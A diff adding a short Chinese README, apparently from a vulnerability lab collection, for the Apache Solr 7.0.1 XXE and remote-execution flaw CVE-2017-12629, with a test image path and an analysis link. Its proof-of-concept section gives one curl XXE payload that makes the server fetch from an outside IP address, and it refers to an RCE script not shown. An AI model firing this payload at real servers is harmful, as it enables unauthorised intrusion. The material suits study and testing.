@@ -1,0 +1,19 @@
+## CVE-2017-12629 - add-listener 命令执行特性 / XXE
+
+测试镜像
+
+* src/solr/7.0.1/
+
+参考文档
+
+* [CVE-2017-12629 - Apache Solr XXE & RCE 漏洞分析](https://paper.seebug.org/425/)
+
+Poc
+
+```
+# XXE
+curl '127.0.0.1/solr/Urahara/select?q={!xmlparser%20v=%27%3C!DOCTYPE%20a%20SYSTEM%20%22http://192.168.154.200/123%22%3E%3Ca%3E%3C/a%3E%27}'
+
+# solr.RunExecutableListener
+参考 cve-2017-12629.sh
+```
